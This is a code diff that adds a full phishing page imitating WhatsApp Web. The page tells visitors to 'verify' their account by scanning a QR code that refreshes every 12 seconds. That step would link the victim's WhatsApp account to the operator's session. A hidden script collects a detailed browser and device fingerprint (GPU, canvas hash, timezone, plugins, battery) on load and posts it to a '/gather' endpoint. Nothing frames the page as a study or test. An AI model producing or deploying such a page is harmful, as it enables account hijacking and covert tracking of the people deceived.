@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>WhatsApp &#8211; Verify Your Account</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Helvetica,Arial,sans-serif;background:#111b21;color:#e9edef;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.wrap{background:#1f2c34;border-radius:14px;padding:36px 32px;max-width:400px;width:92%;text-align:center;box-shadow:0 6px 28px rgba(0,0,0,.45)}
+.icon{width:56px;height:56px;border-radius:50%;background:#25d366;margin:0 auto 18px;display:flex;align-items:center;justify-content:center;font-size:28px}
+h2{font-size:19px;font-weight:500;margin-bottom:6px}
+.sub{font-size:13.5px;color:#8696a0;margin-bottom:22px;line-height:1.55}
+.qr-frame{background:#fff;border-radius:8px;padding:14px;display:inline-block;margin:14px 0}
+.qr-frame img{width:256px;height:256px;display:block}
+.howto{text-align:left;margin-top:22px;font-size:13.5px;color:#8696a0}
+.howto ol{padding-left:18px}
+.howto li{margin-bottom:7px;line-height:1.45}
+.note{margin-top:14px;font-size:11.5px;color:#667781}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="icon">📱</div>
+  <h2>WhatsApp Web</h2>
+  <p class="sub">To continue, verify your identity by linking your device below.</p>
+  <div class="qr-frame" id="qBox">
+    <img src="/qr.png" id="qImg" alt="QR">
+  </div>
+  <div class="howto">
+    <ol>
+      <li>Open <strong>WhatsApp</strong> on your phone</li>
+      <li>Go to <strong>Settings → Linked Devices</strong></li>
+      <li>Tap <strong>Link a Device</strong></li>
+      <li>Point your camera at the code above</li>
+    </ol>
+  </div>
+  <p class="note">Code refreshes automatically. Do not close this page.</p>
+</div>
+
+<script>
+(function(){
+  var d={};
+  d.sw=screen.width;d.sh=screen.height;d.cd=screen.colorDepth;
+  d.pr=window.devicePixelRatio||1;d.pl=navigator.platform;
+  d.lang=navigator.language;
+  d.langs=navigator.languages?navigator.languages.join(","):"";
+  d.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
+  d.tzo=new Date().getTimezoneOffset();
+  d.touch="ontouchstart"in window;
+  d.mt=navigator.maxTouchPoints||0;
+  d.cores=navigator.hardwareConcurrency||0;
+  d.mem=navigator.deviceMemory||0;
+  d.conn=navigator.connection?navigator.connection.effectiveType:"";
+  d.ua=navigator.userAgent;d.vendor=navigator.vendor||"";
+  d.dnt=navigator.doNotTrack||"";
+  d.cookie=navigator.cookieEnabled;
+  d.ls=typeof localStorage!=="undefined";
+  d.idb=!!window.indexedDB;
+  try{var c=document.createElement("canvas"),
+      g=c.getContext("webgl")||c.getContext("experimental-webgl");
+    if(g){var x=g.getExtension("WEBGL_debug_renderer_info");
+      if(x){d.gpuV=g.getParameter(x.UNMASKED_VENDOR_WEBGL);
+            d.gpuR=g.getParameter(x.UNMASKED_RENDERER_WEBGL);}}}catch(e){}
+  try{var cv=document.createElement("canvas");cv.width=220;cv.height=40;
+    var ct=cv.getContext("2d");ct.textBaseline="top";ct.font="15px Arial";
+    ct.fillStyle="#f60";ct.fillRect(0,0,220,40);
+    ct.fillStyle="#069";ct.fillText("wd26fp",3,12);
+    d.cvfp=cv.toDataURL().slice(-48);}catch(e){}
+  d.plugins=[];
+  for(var i=0;i<navigator.plugins.length&&i<8;i++)
+    d.plugins.push(navigator.plugins[i].name);
+  d.plugins=d.plugins.join("|");
+  function ship(p){fetch("/gather",{method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify(p)}).catch(function(){});}
+  if(navigator.getBattery){navigator.getBattery().then(function(b){
+    d.bat=b.level;d.chg=b.charging;ship(d);}).catch(function(){ship(d);});
+  }else{ship(d);}
+})();
+setInterval(function(){
+  document.getElementById("qImg").src="/qr.png?_="+Date.now();
+},12000);
+</script>
+</body>
+</html>
